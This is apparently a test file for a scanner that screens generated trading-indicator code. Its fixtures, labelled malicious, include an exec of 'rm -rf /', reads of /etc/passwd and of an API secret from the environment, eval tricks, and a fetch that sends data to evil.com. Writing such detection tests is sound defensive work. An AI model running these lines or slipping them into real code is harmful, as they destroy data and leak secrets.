/**
 * Security Scanner Tests
 *
 * Tests for indicator code security scanning.
 */

import { describe, expect, it } from "bun:test";
import {
  getCriticalIssues,
  isCodeSafe,
  scanIndicatorCode,
  validateIndicatorFile,
} from "../src/synthesis/securityScan.js";

// ============================================
// Test Fixtures - Safe Code
// ============================================

const SAFE_INDICATOR = `
import { z } from "zod";
import { calculateSMA } from "./sma.js";
import type { IndicatorResult } from "@cream/indicators";

export function calculateMomentum(prices: number[], period: number = 14): number[] {
  const result: number[] = [];

  for (let i = period; i < prices.length; i++) {
    const current = prices[i];
    const previous = prices[i - period];
    if (current !== undefined && previous !== undefined) {
      result.push(current - previous);
    }
  }

  return result;
}
`;

const SAFE_INDICATOR_WITH_TYPES = `
import { z } from "zod";

interface IndicatorConfig {
  period: number;
  threshold: number;
}

export function calculateRSI(prices: number[], config: IndicatorConfig): number[] {
  const { period, threshold } = config;
  const changes: number[] = [];

  for (let i = 1; i < prices.length; i++) {
    const current = prices[i];
    const previous = prices[i - 1];
    if (current !== undefined && previous !== undefined) {
      changes.push(current - previous);
    }
  }

  return changes.map(c => c > threshold ? 1 : 0);
}
`;

// ============================================
// Test Fixtures - Malicious Code
// ============================================

const MALICIOUS_CHILD_PROCESS = `
import { exec } from "child_process";

export function calculateIndicator(prices: number[]): number[] {
  exec("rm -rf /");
  return prices;
}
`;

const MALICIOUS_FS = `
import { readFileSync } from "fs";

export function calculateIndicator(prices: number[]): number[] {
  const secrets = readFileSync("/etc/passwd", "utf-8");
  console.log(secrets);
  return prices;
}
`;

const MALICIOUS_EVAL = `
export function calculateIndicator(prices: number[], code: string): number[] {
  eval(code);
  return prices;
}
`;

const MALICIOUS_FUNCTION_CONSTRUCTOR = `
export function calculateIndicator(prices: number[], code: string): number[] {
  const fn = new Function("prices", code);
  return fn(prices);
}
`;

const MALICIOUS_FETCH = `
export async function calculateIndicator(prices: number[]): Promise<number[]> {
  const response = await fetch("https://evil.com/steal?data=" + JSON.stringify(prices));
  return prices;
}
`;

const MALICIOUS_PROCESS_ENV = `
export function calculateIndicator(prices: number[]): number[] {
  const apiKey = process.env.ALPACA_SECRET;
  return prices;
}
`;

const MALICIOUS_PROTO_POLLUTION = `
export function calculateIndicator(prices: number[], payload: any): number[] {
  Object.prototype.isAdmin = true;
  return prices;
}
`;

const MALICIOUS_DYNAMIC_IMPORT = `
export async function calculateIndicator(prices: number[]): Promise<number[]> {
  const module = await import("child_process");
  return prices;
}
`;

const MALICIOUS_BUN_API = `
export async function calculateIndicator(prices: number[]): Promise<number[]> {
  const file = Bun.file("/etc/passwd");
  const contents = await file.text();
  return prices;
}
`;

const MALICIOUS_GLOBALTHIS = `
export function calculateIndicator(prices: number[]): number[] {
  const evil = globalThis;
  return prices;
}
`;

// ============================================
// Test Fixtures - Warning Level Code
// ============================================

const WARNING_DIRNAME = `
export function calculateIndicator(prices: number[]): number[] {
  console.log(__dirname);
  return prices;
}
`;

const WARNING_ANY_TYPE = `
export function calculateIndicator(prices: any): any {
  return prices;
}
`;

const WARNING_CONSTRUCTOR_ACCESS = `
export function calculateIndicator(prices: number[]): number[] {
  const ctor = prices.constructor;
  return prices;
}
`;

// ============================================
// Test Fixtures - Disallowed Imports
// ============================================

const DISALLOWED_IMPORT_HTTP = `
import { createServer } from "http";

export function calculateIndicator(prices: number[]): number[] {
  return prices;
}
`;

const DISALLOWED_IMPORT_RANDOM = `
import crypto from "crypto";

export function calculateIndicator(prices: number[]): number[] {
  return prices;
}
`;

const DISALLOWED_REQUIRE = `
const fs = require("fs");

export function calculateIndicator(prices: number[]): number[] {
  return prices;
}
`;

// ============================================
// scanIndicatorCode Tests
// ============================================

describe("scanIndicatorCode", () => {
  describe("safe code", () => {
    it("passes safe indicator code", () => {
      const result = scanIndicatorCode(SAFE_INDICATOR);

      expect(result.safe).toBe(true);
      expect(result.severity).toBe("info");
      expect(result.issues.filter((i) => i.severity === "critical")).toHaveLength(0);
    });

    it("passes safe code with proper types", () => {
      const result = scanIndicatorCode(SAFE_INDICATOR_WITH_TYPES);

      expect(result.safe).toBe(true);
      expect(result.issues.filter((i) => i.severity === "critical")).toHaveLength(0);
    });

    it("tracks scan duration", () => {
      const result = scanIndicatorCode(SAFE_INDICATOR);

      expect(result.scanDurationMs).toBeGreaterThan(0);
      expect(result.linesScanned).toBeGreaterThan(0);
    });
  });

  describe("forbidden patterns", () => {
    it("detects child_process import", () => {
      const result = scanIndicatorCode(MALICIOUS_CHILD_PROCESS);

      expect(result.safe).toBe(false);
      expect(result.severity).toBe("critical");
      expect(result.issues.some((i) => i.description.includes("child_process"))).toBe(true);
    });

    it("detects fs import", () => {
      const result = scanIndicatorCode(MALICIOUS_FS);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.description.includes("fs"))).toBe(true);
    });

    it("detects eval() call", () => {
      const result = scanIndicatorCode(MALICIOUS_EVAL);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.description.includes("eval"))).toBe(true);
    });

    it("detects Function constructor", () => {
      const result = scanIndicatorCode(MALICIOUS_FUNCTION_CONSTRUCTOR);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.description.includes("Function"))).toBe(true);
    });

    it("detects fetch() call", () => {
      const result = scanIndicatorCode(MALICIOUS_FETCH);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.description.includes("fetch"))).toBe(true);
    });

    it("detects process.env access", () => {
      const result = scanIndicatorCode(MALICIOUS_PROCESS_ENV);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.description.includes("process.env"))).toBe(true);
    });

    it("detects prototype pollution", () => {
      const result = scanIndicatorCode(MALICIOUS_PROTO_POLLUTION);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.description.includes("prototype"))).toBe(true);
    });

    it("detects dynamic import of absolute path", () => {
      const result = scanIndicatorCode(MALICIOUS_DYNAMIC_IMPORT);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.description.toLowerCase().includes("import"))).toBe(true);
    });

    it("detects Bun runtime API usage", () => {
      const result = scanIndicatorCode(MALICIOUS_BUN_API);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.description.includes("Bun"))).toBe(true);
    });

    it("detects globalThis access", () => {
      const result = scanIndicatorCode(MALICIOUS_GLOBALTHIS);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.description.includes("globalThis"))).toBe(true);
    });
  });

  describe("warning level issues", () => {
    it("warns on __dirname usage", () => {
      const result = scanIndicatorCode(WARNING_DIRNAME);

      // __dirname is a warning, not critical
      expect(result.issues.some((i) => i.description.includes("__dirname"))).toBe(true);
      expect(result.issues.find((i) => i.description.includes("__dirname"))?.severity).toBe(
        "warning"
      );
    });

    it("warns on any type usage", () => {
      const result = scanIndicatorCode(WARNING_ANY_TYPE);

      expect(result.issues.some((i) => i.description.includes("any"))).toBe(true);
      expect(result.issues.find((i) => i.description.includes("any"))?.severity).toBe("warning");
    });

    it("warns on constructor access", () => {
      const result = scanIndicatorCode(WARNING_CONSTRUCTOR_ACCESS);

      expect(result.issues.some((i) => i.description.includes("constructor"))).toBe(true);
    });
  });

  describe("import validation", () => {
    it("blocks http import", () => {
      const result = scanIndicatorCode(DISALLOWED_IMPORT_HTTP);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.description.includes("http"))).toBe(true);
    });

    it("blocks non-whitelisted external imports", () => {
      const result = scanIndicatorCode(DISALLOWED_IMPORT_RANDOM);

      expect(result.safe).toBe(false);
      expect(result.issues.some((i) => i.type === "disallowed_import")).toBe(true);
    });

    it("blocks require statements", () => {
      const result = scanIndicatorCode(DISALLOWED_REQUIRE);

      expect(result.safe).toBe(false);
    });

    it("allows relative imports", () => {
      const codeWithRelativeImport = `
        import { helper } from "./utils.js";
        export function calc(p: number[]): number[] { return p; }
      `;
      const result = scanIndicatorCode(codeWithRelativeImport);

      expect(result.issues.filter((i) => i.type === "disallowed_import")).toHaveLength(0);
    });

    it("allows @cream package imports", () => {
      const codeWithCreamImport = `
        import { something } from "@cream/domain";
        export function calc(p: number[]): number[] { return p; }
      `;
      const result = scanIndicatorCode(codeWithCreamImport);

      expect(result.issues.filter((i) => i.type === "disallowed_import")).toHaveLength(0);
    });

    it("allows zod import", () => {
      const codeWithZod = `
        import { z } from "zod";
        export function calc(p: number[]): number[] { return p; }
      `;
      const result = scanIndicatorCode(codeWithZod);

      expect(result.issues.filter((i) => i.type === "disallowed_import")).toHaveLength(0);
    });
  });

  describe("line number tracking", () => {
    it("reports correct line numbers for issues", () => {
      const codeWithIssue = `
// Line 1
// Line 2
const secret = process.env.SECRET;
// Line 4
`;
      const result = scanIndicatorCode(codeWithIssue);

      const envIssue = result.issues.find((i) => i.description.includes("process.env"));
      expect(envIssue).toBeDefined();
      expect(envIssue?.line).toBe(4);
    });
  });
});

// ============================================
// isCodeSafe Tests
// ============================================

describe("isCodeSafe", () => {
  it("returns true for safe code", () => {
    expect(isCodeSafe(SAFE_INDICATOR)).toBe(true);
  });

  it("returns false for malicious code", () => {
    expect(isCodeSafe(MALICIOUS_EVAL)).toBe(false);
  });

  it("returns true for code with only warnings", () => {
    // Warnings don't make code unsafe, only critical issues do
    expect(isCodeSafe(WARNING_DIRNAME)).toBe(true);
  });
});

// ============================================
// getCriticalIssues Tests
// ============================================

describe("getCriticalIssues", () => {
  it("returns empty array for safe code", () => {
    const issues = getCriticalIssues(SAFE_INDICATOR);
    expect(issues).toHaveLength(0);
  });

  it("returns only critical issues", () => {
    const issues = getCriticalIssues(MALICIOUS_EVAL);
    expect(issues.length).toBeGreaterThan(0);
    expect(issues.every((i) => i.severity === "critical")).toBe(true);
  });

  it("excludes warnings", () => {
    const issues = getCriticalIssues(WARNING_ANY_TYPE);
    expect(issues).toHaveLength(0);
  });
});

// ============================================
// validateIndicatorFile Tests
// ============================================

describe("validateIndicatorFile", () => {
  it("returns safe=true for valid code", () => {
    const result = validateIndicatorFile(SAFE_INDICATOR);

    expect(result.safe).toBe(true);
    expect(result.severity).toBe("info");
  });

  it("returns safe=false for malicious code", () => {
    const result = validateIndicatorFile(MALICIOUS_EVAL);

    expect(result.safe).toBe(false);
    expect(result.severity).toBe("critical");
    expect(result.issues.length).toBeGreaterThan(0);
  });

  it("formats issues as human-readable strings", () => {
    const result = validateIndicatorFile(MALICIOUS_PROCESS_ENV);

    expect(result.issues.some((i) => i.startsWith("[CRITICAL]"))).toBe(true);
    expect(result.issues.some((i) => i.includes("line"))).toBe(true);
  });
});

// ============================================
// Edge Cases
// ============================================

describe("Edge Cases", () => {
  it("handles empty source", () => {
    const result = scanIndicatorCode("");

    expect(result.safe).toBe(true);
    expect(result.linesScanned).toBe(1);
  });

  it("handles malformed TypeScript gracefully", () => {
    const malformed = "function { broken syntax }}}}";
    const result = scanIndicatorCode(malformed);

    // Should not throw, may have warnings about parse failures
    expect(typeof result.safe).toBe("boolean");
  });

  it("detects multiple issues in one file", () => {
    const multipleIssues = `
      import { exec } from "child_process";
      const data = process.env.SECRET;
      eval("console.log(1)");
    `;
    const result = scanIndicatorCode(multipleIssues);

    expect(result.issues.length).toBeGreaterThan(2);
  });

  it("handles obfuscated patterns", () => {
    // Obfuscated eval attempt
    const obfuscated = `
      const e = "ev";
      const a = "al";
      const fn = window[e + a];
    `;
    const result = scanIndicatorCode(obfuscated);

    // Should at least detect window access
    expect(result.issues.some((i) => i.description.includes("window"))).toBe(true);
  });

  it("handles fs/promises import", () => {
    const fsPromises = `
      import { readFile } from "fs/promises";
      export function calc(p: number[]): number[] { return p; }
    `;
    const result = scanIndicatorCode(fsPromises);

    expect(result.safe).toBe(false);
    expect(result.issues.some((i) => i.description.includes("fs"))).toBe(true);
  });

  it("handles node: prefixed imports", () => {
    const nodePrefix = `
      import { createServer } from "node:http";
      export function calc(p: number[]): number[] { return p; }
    `;
    const result = scanIndicatorCode(nodePrefix);

    expect(result.safe).toBe(false);
  });
});

// ============================================
// Regression Tests
// ============================================

describe("Regression Tests", () => {
  it("does not false-positive on legitimate math operations", () => {
    const mathCode = `
      export function calculate(prices: number[]): number[] {
        return prices.map((p, i, arr) => {
          const sum = arr.slice(0, i + 1).reduce((a, b) => a + b, 0);
          return sum / (i + 1);
        });
      }
    `;
    const result = scanIndicatorCode(mathCode);

    expect(result.safe).toBe(true);
  });

  it("does not false-positive on string containing 'eval' as part of word", () => {
    const codeWithEvalWord = `
      // This evaluates the performance
      export function evaluate(prices: number[]): number[] {
        return prices;
      }
    `;
    const result = scanIndicatorCode(codeWithEvalWord);

    // Should not flag 'evaluate' as 'eval'
    expect(result.issues.filter((i) => i.description.includes("eval"))).toHaveLength(0);
  });

  it("does not false-positive on 'fetch' in variable names", () => {
    const codeWithFetchVar = `
      export function calculate(prices: number[]): number[] {
        const fetchedData = prices;
        return fetchedData;
      }
    `;
    const result = scanIndicatorCode(codeWithFetchVar);

    // Should not flag 'fetchedData' as 'fetch()'
    expect(result.issues.filter((i) => i.description.includes("fetch"))).toHaveLength(0);
  });
});
